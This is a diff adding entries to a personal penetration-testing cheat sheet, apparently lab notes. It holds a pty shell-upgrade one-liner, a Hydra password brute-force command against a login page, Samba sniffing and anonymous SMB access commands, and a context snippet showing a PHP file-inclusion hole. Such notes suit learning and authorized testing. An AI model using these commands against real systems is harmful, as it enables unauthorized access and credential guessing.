@@ -1,9 +1,36 @@
 # I'm the BEST to ever DO IT
  ### GENERAL
+ ##### Lemmie upgrade you
  ```bash
- 
+Upgrade $ /bin/sh to full /bin/bash shell
+python -c "import pty;pty.spawn('/bin/bash')"
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+##### Samba Enumeration 
+```bash
+sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 
  ```
-
+##### SSH w0nT C0nN3cT
+```bash
+-oKexAlgorithms=+diffie-hellman-group1-sha1
+```
+##### Hydra easy
+```bash
+hydra -l bethany -P /usr/share/wordlists/rockyou.txt -s 9505 -f 10.11.1.50 http-get /~login -V -I
+```
+##### WP easy
+```bash
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+```
+##### VPN Trouble shooting
+```bash
+sudo nano /etc/resolv.conf
+sudo NetworkManager restart
+```
+##### SMBSUCKS Try this
+```bash
+smbclient //MOUNT/Yourmomma -I 192.168.154.55 -N
+```
 ### SQLi 
 ```bash
 
@@ -191,8 +218,6 @@ requires allow_url_fopen=On and allow_url_include=On
 
 $incfile = $_REQUEST["file"];  
 include($incfile.".php");  
-```
-
 ```
 
 ###  POWERSHELL
